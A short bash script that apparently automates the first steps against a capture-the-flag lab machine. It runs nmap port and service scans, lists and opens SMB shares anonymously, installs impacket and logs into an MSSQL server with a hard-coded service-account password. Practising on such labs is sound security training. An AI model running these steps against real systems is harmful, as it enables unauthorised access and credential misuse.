#!/bin/bash

echo "Scanning ports with nmap..."
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.27 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -sC -sV -p$ports 10.10.10.27

echo "Listing smb server files..."
smbclient -N -L \\\\10.10.10.27\\

echo "Opening backups..."
smbclient -N \\\\10.10.10.27\\backups

echo "Downloading impacket..."
wget https://github.com/SecureAuthCorp/impacket/releases/download/impacket_0_9_21/impacket-0.9.21.tar.gz && tar -xvf impacket-0.9.21.tar.gz
cd impacket-0.9.21/

echo "Installing impacket..."
pip3 install .
cd examples

echo "Fixing python..."
find mssqlclient.py -type f -exec sed -i 's/python/python3/g' {} \;

echo "Logging in to SQL database..."
./mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27 -windows-auth
